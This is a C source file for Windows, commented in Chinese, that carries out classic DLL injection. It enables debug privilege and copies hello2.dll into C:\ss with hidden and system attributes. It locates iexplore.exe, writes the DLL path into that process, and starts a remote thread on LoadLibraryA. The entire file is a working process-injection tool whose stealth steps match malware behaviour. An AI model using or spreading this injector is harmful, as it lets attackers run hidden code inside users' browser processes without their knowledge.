#include "stdio.h"
#include "windows.h"
#include "string.h"
#include "tchar.h"
#include "tlhelp32.h"
#define INJECT_PROCESS_NAME "iexplore.exe"
typedef DWORD (*NtCreateThread)(HANDLE, DWORD, HANDLE ,HANDLE , HANDLE , void * , DWORD , DWORD , DWORD , DWORD , DWORD );
//根据进程ID获取进程句柄
HANDLE GetProcessHandle(DWORD deProcessID)
{
    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION  //查询进程句柄
        | PROCESS_VM_OPERATION     //PROCESS_VM_WRITE + PROCESS_VM_READ + x 
        | PROCESS_CREATE_THREAD    //创建线程
        | PROCESS_VM_WRITE,        //WriteProcessMemory
        FALSE,                     //不继承
        deProcessID                //进程句柄
        ); 

    return hProcess;
}
//提升进程权限
int UP_Privileges(const LPTSTR name)
{
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    //打开进程令牌环
    if(!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&token))
    {
        printf("open process token error!\n");
        return 0;
    }
    //获得进程本地唯一ID
    LUID luid;
    if(!LookupPrivilegeValue(NULL,name,&luid))
    {
        printf("lookup privilege value error!\n");
        return 0;
    }
    tp.PrivilegeCount=1;
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    tp.Privileges[0].Luid=luid;
    //调整进程权限
    if(!AdjustTokenPrivileges(token,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL))
    {
        printf("adjust token privilege error!\n");
        return 0;
    }
    return 1;
}
int _tmain(int argc, _TCHAR* argv[])
{
	UP_Privileges(SE_DEBUG_NAME); //
	char currentpath[1024];
	char copypath[1024]="C:\\ss\\hello2.dll";
	GetCurrentDirectory(1000,currentpath); //取当前运行文件目录
	strcat(currentpath,"\\hello2.dll");
	CopyFile(currentpath, copypath, FALSE); //文件复制
	SetFileAttributes(copypath, FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM); //修改文件属性为系统文件和隐藏文件


	//LoadLibrary("hello.dll");
    DWORD dwErrCode = 0;
	
    //获取进程ID
    //HWND hWnd = FindWindow(NULL, _T("计算器"));
   	char te[MAX_PATH];

    PROCESSENTRY32 pe32;
    DWORD dwRemoteProcessId;
    pe32.dwSize = sizeof(pe32);
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot error.\n");
        return 0;
    }
    if (Process32First(hProcessSnap, &pe32)){ 
        do {
            
            strcpy(te, pe32.szExeFile);
            if (strcmp(te, INJECT_PROCESS_NAME) == 0) {
                dwRemoteProcessId = pe32.th32ProcessID;
                printf("%d\n", dwRemoteProcessId);
                break;
            }
            printf("%s----%d\n", pe32.szExeFile, pe32.th32ProcessID);
        } 
        while ( Process32Next ( hProcessSnap , & pe32 ));  
    } 
    else {
    	printf("No process has been found!\n");
        return - 1;
    }
    CloseHandle(hProcessSnap);

    DWORD dwProcessID = 0;
    HANDLE hDestProcess = GetProcessHandle(dwRemoteProcessId);
    if(NULL == hDestProcess) 
    {
        return 0;
    }


    //获取KERNER32.DLL 模块句柄
    HMODULE hModule = GetModuleHandle(_T("kernel32.dll")); 
    if(NULL == hModule) 
    {
        return -1;
    }

    //线程函数，kernerl32.dll被映射到所有进程内相同的地址
    LPTHREAD_START_ROUTINE lpThreadStartRoutine = 
                         (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryA");

    if(NULL == lpThreadStartRoutine) 
    {
        return -2; 
    }

    //从目标进程内申请堆内存
    LPVOID lpMemory = VirtualAllocEx(
                     hDestProcess, NULL, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);  
    if(NULL == lpMemory) 
    {
        return -3;
    }

    //注入DLL
    LPCTSTR lpDLLName = _T(copypath);

    //把DLL名字写入目标进程
    BOOL bWriteMemory = WriteProcessMemory(
        hDestProcess, lpMemory, (void *)lpDLLName, (_tcslen(lpDLLName) + 1) * sizeof(lpDLLName[0]), NULL);

    if(FALSE == bWriteMemory) 
    {
        dwErrCode = GetLastError();
        VirtualFreeEx(hModule, lpMemory, 0, MEM_RELEASE | MEM_DECOMMIT);
        return -4;
    }
 

    //创建远程线程
    HANDLE hThread = CreateRemoteThread(
        hDestProcess, 
        NULL,
        0,
        lpThreadStartRoutine,
        lpMemory,
        0,
        NULL);
    if (NULL == hThread || INVALID_HANDLE_VALUE == hThread)
    {
        VirtualFreeEx(hModule, lpMemory, 0, MEM_RELEASE | MEM_DECOMMIT);
        return -5;
    }
    VirtualFreeEx(hModule, lpMemory, 0, MEM_RELEASE | MEM_DECOMMIT);  
	system("pause");
    return 0;
}